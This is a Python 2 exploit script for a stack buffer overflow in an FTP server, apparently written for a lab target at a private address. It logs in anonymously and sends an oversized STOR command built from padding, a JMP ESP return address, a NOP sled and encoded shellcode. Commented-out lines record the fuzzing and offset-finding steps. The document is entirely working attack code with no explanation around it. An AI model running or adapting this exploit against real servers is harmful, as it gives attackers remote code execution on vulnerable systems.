#!/usr/bin/python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# buffer = '\x41' * 2000

# buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0A$

# 77D8AF0A   FFE4             JMP ESP

shellcode = ("\xd9\xc7\xd9\x74\x24\xf4\xbe\x3f\x57\x31\x53\x5b\x31\xc9" +
"\xb1\x06\x31\x73\x18\x03\x73\x18\x83\xc3\x3b\xb5\xc4\xe8" +
"\x0b\x78\x7f\x0f\xd8\xf3\x99\x3e\x1e\x53\x30\x17\xce\xec" +
"\xb7\x92\x36\x7b\x37\x4c")

# Flip the hex!!!!!!!!!
buffer = "\x41"*965 + "\x0A\xAF\xD8\x77" + "\x43"*16 + "\x90"*16 + shellcode + "\xcc"*1014

print "\nSending evil buffer..."
s.connect(('192.168.17.111',21))
data = s.recv(1024)
s.send('USER ftp' +'\r\n')
data = s.recv(1024)
s.send('PASS ftp' +'\r\n')
data = s.recv(1024)
s.send('STOR ' +buffer+'\r\n')
s.close()
